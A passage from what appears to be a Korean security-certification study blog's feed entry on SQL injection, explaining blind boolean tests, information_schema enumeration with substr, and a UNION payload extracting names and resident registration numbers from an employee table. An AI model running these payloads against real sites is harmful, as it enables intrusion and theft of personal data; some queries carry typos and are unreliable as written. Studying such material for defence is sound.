&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                &lt;/div&gt;
                &lt;ul&gt;
                  &lt;li&gt;설명
                    &lt;ul&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$search&lt;/code&gt; : 사용자가 입력한 검색어&lt;/li&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$find&lt;/code&gt; : 제목, 내용, 작성자, 내용+제목 등&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;검색어에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; and 1=1#&lt;/code&gt; 입력 시
                    &lt;ul&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;where $find like &apos;%&apos; and 1=1#%&lt;/code&gt;
                        &lt;ul&gt;
                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$find like &apos;%&apos;&lt;/code&gt; : True&lt;/li&gt;
                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1=1&lt;/code&gt; : True&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;검색어에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; and 1=2#&lt;/code&gt; 입력 시
                    &lt;ul&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;where $find like &apos;%&apos; and 1=1#%&lt;/code&gt;
                        &lt;ul&gt;
                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$find like &apos;%&apos;&lt;/code&gt; : True&lt;/li&gt;
                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1=2&lt;/code&gt; : False&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;True 와 False 에 대한 결과로 BlindSQL Injection 가능여부를 판단&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;스키마
                &lt;ul&gt;
                  &lt;li&gt;Information_schema : DB의 구조, 제약조건 등 메타 데이터를 제공&lt;/li&gt;
                  &lt;li&gt;Information_schema.tables : 모든 테이블에 대한 정보&lt;/li&gt;
                  &lt;li&gt;Information_shcema.columns : 모든 테이블의 컬럼정보&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;함수
                &lt;ul&gt;
                  &lt;li&gt;limit : 출력 레코드의 개수를 제한하는 함수 (ex:limit pos,len)&lt;/li&gt;
                  &lt;li&gt;substr : 문자열을 추출하는 함수 (ex:substr(문자열, pos, len))
                    &lt;ul&gt;
                      &lt;li&gt;pos : 시작위치 / len : 문자개수
                        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  select table_schema, table_name, table_type from information_schema.tables
  where table_type = &apos;base table&apos; -- 사용자가 만든 테이블
  limit 0,1 ;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                        &lt;/div&gt;
                      &lt;/li&gt;
                      &lt;li&gt;사용자가 만든 테이블을 처음부터 1개 가져오기
                        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  select substr((select table_name from information_shcema.tables where table_type = &apos;base table&apos; limit 0, 1), 1, 1) from dual;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                        &lt;/div&gt;
                      &lt;/li&gt;
                      &lt;li&gt;사용자가 만든 테이블명을 처음부터 1개 가져와서 앞자리 확인
                        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  select column_name from information_schema.columns
  where table_name = &apos;employee&apos; 
  limit 0, 1;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                        &lt;/div&gt;
                      &lt;/li&gt;
                      &lt;li&gt;테이블명이 ‘employee’ 인 컬럼명을 처음부터 1개 가져오기&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;활용법
                &lt;ul&gt;
                  &lt;li&gt;검색창에 입력
                    &lt;ul&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; and substr((select table_name from information_schema.tables where table_type=&apos;base table&apos; limit 0,1),1,1)=&apos;a&apos;#&lt;/code&gt;&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;완성 쿼리 내용
                    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      select * from bbs where subhect like &apos;%
      &apos; and substr((select table_name from information_schema.tables where table_type=&apos;base table&apos; limit 0,1),1,1)=&apos;a&apos;#%&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                    &lt;/div&gt;
                    &lt;ul&gt;
                      &lt;li&gt;검색 결과값이 나오면 참, 결과값이 없으면 거짓&lt;/li&gt;
                      &lt;li&gt;자동화된 툴을 이용해서 테이블 정보를 파악&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;과정
            &lt;ul&gt;
              &lt;li&gt;Table 정보 -&amp;gt; 필드(Column) 정보 -&amp;gt; Data 획득
                &lt;ul&gt;
                  &lt;li&gt;information_schema.tables, information_schema.columns, union select 이용&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;테이블명 획득
                &lt;ul&gt;
                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; and substr((select table_name ...),1,1)=&apos;a&apos;#&lt;/code&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%27+and+substr%28%28select+table_name...&lt;/code&gt;
                    &lt;ul&gt;
                      &lt;li&gt;POST 의 Message Body 영역에 URIEncoding 방식으로 변경되어 전송됨&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;컬럼정보 획득 (획득한 테이블 정보 employee)
                &lt;ul&gt;
                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; and substr((select column_name from information_schema.columns where tablew_name=&apos;employee&apos; limit 0,1),1,1)=&apos;a&apos;#&lt;/code&gt;&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;Data 획득 (획득한 컬럼정보 이용)
                &lt;ul&gt;
                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; and 1=2 union select &apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;,&apos;i&apos;#&lt;/code&gt;
                    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  select * from bbs where subject like &apos;%&apos; and 1=2 union select &apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;, &apos;f&apos;, &apos;g&apos;, &apos;h&apos;, &apos;i&apos;#%&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                    &lt;/div&gt;
                    &lt;ul&gt;
                      &lt;li&gt;1=2 를 통해 원 검색결과 출력을 막음&lt;/li&gt;
                      &lt;li&gt;필드개수 9개 : bbs의 필드개수와 동일하게 설정&lt;/li&gt;
                      &lt;li&gt;출력 결과를 통해 웹사이트의 필드가 어떤 컬럼과 매핑되는지 확인&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;출력위치 확인 후 해당 위치로 employee 테이블의 조회결과 출력&lt;/li&gt;
                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; and 1=2 union select null,null,null,concat(name, &apos;/&apos;, juminNo), null, null, null, null, null from employee#&lt;/code&gt;
                    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  select * from bbs where subject like &apos;%&apos; and 1=2 union select null, null, null, concat(name, &apos;/&apos;, juminNo), null, null, null, null, null from employee#%&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                    &lt;/div&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name>HY03</name><email>hyunik03@gmail.com</email></author><category term="IS_Certification" /><category term="정보보안기사" /><category term="어플리케이션" /><summary type="html">SQL Injection</summary></entry></feed>